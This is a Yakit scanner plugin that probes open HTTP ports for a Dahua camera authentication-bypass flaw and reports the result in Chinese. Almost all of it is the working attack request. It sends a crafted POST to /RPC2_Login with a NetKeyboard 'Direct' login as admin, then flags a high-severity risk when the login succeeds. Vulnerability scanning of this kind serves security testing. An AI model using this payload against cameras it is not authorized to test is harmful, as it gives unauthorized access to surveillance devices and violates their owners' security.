# port scan plugin
yakit.AutoInitYakit()
log.setLevel("info")

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
POST /RPC2_Login HTTP/1.1
Host: {{params(target)}}
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Connection: close

{"method":"global.login","params":{"userName": "admin","password": "Not Used","clientType": "NetKeyboard","loginType": "Direct",
"authorityType": "Default","passwordType": "Default"},"id":1,"session":0}`
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

    hand, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
    drsp, derr = str.ParseBytesToHTTPResponse(rsp)
    jbody = json.loads(body)

    // dump(rsp)
    if drsp.StatusCode == 200 && jbody["result"] == true {
        risk.NewRisk(
            addr,risk.title("大华摄像头未授权访问漏洞"),
            risk.severity("high"),
            risk.titleVerbose("大华摄像头未授权访问漏洞"),
            risk.type("未授权访问"),
            risk.details({
                "target": addr,
                "request": req,
                "response": rsp,
            }),
        )
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    // dump(result.GetServiceName())
    // println("-------------------------------")
    // dump(result.GetCPEs())
    // println("-------------------------------")
    // dump(result.GetDomains())
    // println("-------------------------------")
    // dump(result.GetHtmlTitle())
    // println("-------------------------------")
    // dump(result.GetProto())

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
